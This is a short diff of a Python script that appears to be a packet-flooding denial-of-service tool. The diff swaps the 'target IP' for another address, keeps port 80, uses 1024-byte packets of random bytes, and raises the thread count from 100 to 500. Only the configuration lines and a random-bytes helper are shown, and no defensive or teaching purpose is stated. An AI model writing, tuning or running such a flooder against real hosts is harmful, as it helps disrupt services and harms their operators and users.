@@ -3,11 +3,11 @@ import threading
 import random
 
 # Target IP and port
-ip = "107.141.202.11"
-port =80# Packet size
+ip = "194.193.147.22"
+port =80 # Packet size
 packet_size =1024
 # Number of threads
-threads = 100
+threads = 500
 
 def random_bytes(size):
     """Generate a bytes object of random bytes"""
